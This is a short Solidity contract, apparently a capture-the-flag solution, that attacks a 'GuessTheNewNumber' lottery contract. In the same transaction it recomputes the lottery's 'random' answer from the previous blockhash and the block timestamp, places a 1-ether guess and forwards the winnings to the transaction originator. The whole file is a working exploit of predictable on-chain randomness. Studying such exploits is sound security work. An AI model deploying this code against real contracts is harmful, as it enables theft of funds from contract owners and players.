pragma solidity ^0.8.0;
import './lotteries/GuessTheNewNumber.sol';

contract ProxyAttack{
    GuessTheNewNumber public guessContract;

    constructor(address _guessContract) {
        guessContract = GuessTheNewNumber(_guessContract);
    }
    function attack() external payable {
      // simulate the contract
      require(address(this).balance >= 1 ether, "not enough funds");
      uint8 answer = uint8(uint256(
        keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
      ));
      // execute the guess 
      guessContract.guess{value: 1 ether}(answer);

      payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {
    }
}